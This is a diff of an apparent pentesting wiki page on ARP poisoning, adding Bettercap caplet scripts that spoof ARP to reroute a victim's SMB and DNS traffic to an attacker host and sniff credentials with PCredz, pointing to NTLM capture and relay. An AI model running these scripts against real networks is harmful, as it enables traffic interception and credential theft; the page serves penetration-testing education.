@@ -2,11 +2,7 @@
 description: MITRE ATT&CK™ Sub-technique T1557.002
 ---
 
-# 🛠️ ARP poisoning
-
-{% hint style="danger" %}
-**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
-{% endhint %}
+# ARP poisoning
 
 ## Theory
 
@@ -72,13 +68,13 @@ Bettercap also has the [any.proxy](https://www.bettercap.org/modules/ethernet/pr
 * `any.proxy.dst_address` refers to the IP address the matched packets are to be sent to. For instance, when doing WSUS or DNS spoofing attacks in a rerouting technique mode, this option has to be set to the IP address of the attacker's server.
 * `any.proxy.dst_port` refers to the port the matched packets are to be sent to.
 
-### Bettercap logging
+### 🛠️ Bettercap logging
 
 Bettercap's logging can be controlled so that only essential information is shown. Becoming a man-in-the-middle can be a little overwhelming when not filtering the info shown to the user.
 
 * events.ignore TODOOOOO //
 
-### Tips & tricks
+### 🛠️ Tips & tricks
 
 * wireshark, make sure forwarded packets appear twice, one with MAC 1 -&gt; MAC 2, one with MAC 2 -&gt; MAC 3 \(1=victim, 2=attacker, 3=gateway\)
 * Make sure the attacker and the victim client are on the same subnet, I don't know how to operate when they are not
@@ -90,19 +86,11 @@ Bettercap's logging can be controlled so that only essential information is show
 
 ## Scenarios examples
 
-//TODO : explain scenarios
+Below are examples or targetted ARP poisoning attacks where the attacker wants to hijack packets aimed at a specific server \(SMB, DNS, WSUS, ...\), to answer with evil responses. The "dumping network secrets" scenario is the one attackers use to [dump credentials on the network](../credentials/dumping/network-secrets.md) \(usually in order to find an initial foothold\).
 
 {% tabs %}
 {% tab title="SMB spoofing" %}
-//TODO
-
-combine this with inveigh/responder \(capture\) or inveigh-relay/ntlmrelayx \(relay\)
-{% endtab %}
-
-{% tab title="DNS spoofing" %}
-//TODO
-
-start the DNS server \(responder, dnschef, or bettercap\) then start the poisoning attack
+Start the SMB server for [capture](../lm-and-ntlm/capture.md) or [relay](../lm-and-ntlm/relay.md) then start the poisoning attack.
 
 {% code title="wsus\_spoofing.cap" %}
 ```bash
@@ -114,7 +102,40 @@ set arp.spoof.targets $client_ip
 set arp.spoof.internal false
 set arp.spoof.fullduplex false
 
-# reroute traffic aimed at the WSUS server
+# reroute traffic aimed at the original SMB server
+set any.proxy.iface $interface
+set any.proxy.protocol TCP
+set any.proxy.src_address $SMB_server_ip
+set any.proxy.src_port 445
+set any.proxy.dst_address $attacker_ip
+set any.proxy.dst_port 445
+
+# control logging and verbosity
+events.ignore endpoint
+events.ignore net.sniff
+
+# start the modules
+any.proxy on
+arp.spoof on
+net.sniff on
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="DNS spoofing" %}
+Start the DNS server \([responder](https://github.com/lgandx/Responder), [dnschef](https://github.com/iphelix/dnschef), or [bettercap](https://github.com/bettercap/bettercap)\) for [DNS poisoning](dns-spoofing.md) then start the ARP poisoning attack.
+
+{% code title="wsus\_spoofing.cap" %}
+```bash
+# quick recon of the network
+net.probe on
+
+# set the ARP spoofing
+set arp.spoof.targets $client_ip
+set arp.spoof.internal false
+set arp.spoof.fullduplex false
+
+# reroute traffic aimed at the original DNS server
 set any.proxy.iface $interface
 set any.proxy.protocol UDP
 set any.proxy.src_address $DNS_server_ip
@@ -186,9 +207,7 @@ The search for Windows updates can be manually triggered when having access to t
 {% endtab %}
 
 {% tab title="Dumping network secrets" %}
-// TODO
-
-Start PCredz or Wireshark then start the poisoning attack
+Start [PCredz](https://github.com/lgandx/PCredz) or Wireshark then start the poisoning attack
 
 {% code title="wsus\_spoofing.cap" %}
 ```bash
@@ -207,12 +226,10 @@ arp.spoof on
 net.sniff on
 ```
 {% endcode %}
-
-//
 {% endtab %}
 {% endtabs %}
 
-## Below this is info I need to RTFM on...
+## 🛠️ Below this is info I need to RTFM on...
 
 What is iptables -j MASQUERADE and why do I see it all the time in articles and blogs
 
